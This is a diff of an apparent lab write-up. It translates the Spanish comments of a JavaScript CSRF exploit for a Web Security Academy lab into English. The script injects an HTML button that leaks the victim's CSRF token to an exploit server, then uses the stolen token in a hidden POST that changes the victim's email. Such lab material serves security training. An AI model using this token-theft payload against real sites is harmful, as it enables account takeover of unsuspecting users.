@@ -428,22 +428,22 @@ The idea is to use `formaction` to hijack the form and `formmethod="get"` to for
 <body>
 <script>
 /**
- * PASO 1: Configuración de Entorno
+ * STEP 1: Environment Configuration
  */
 const academyFrontend = "https://tu-id-de-laboratorio.web-security-academy.net/";
 const exploitServer = "https://tu-id-de-exploit-server.exploit-server.net/exploit";
 
 /**
- * PASO 2: Extracción del botín
- * Captura el token CSRF que llega como parámetro en la URL.
+ * STEP 2: Loot Extraction
+ * Capture the CSRF token that arrives as a parameter in the URL.
  */
 const url = new URL(location);
 const csrf = url.searchParams.get('csrf');
 
 if (csrf) {
     /**
-     * PASO 3: Ejecución del Ataque (POST silencioso)
-     * Usa el token robado para cambiar el email de la víctima sin que se dé cuenta.
+     * STEP 3: Execution of the Attack (Silent POST)
+     * Use the stolen token to change the victim's email without them noticing.
      */
     const form = document.createElement('form');
     form.method = 'post';
@@ -463,8 +463,8 @@ if (csrf) {
     form.submit();
 } else {
     /**
-     * PASO 0: El Cebo
-     * Redirige a la víctima a la página vulnerable e inyecta el botón malicioso.
+     * STEP 0: The Bait
+     * It redirects the victim to the vulnerable page and injects the malicious button.
      */
     location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
 }
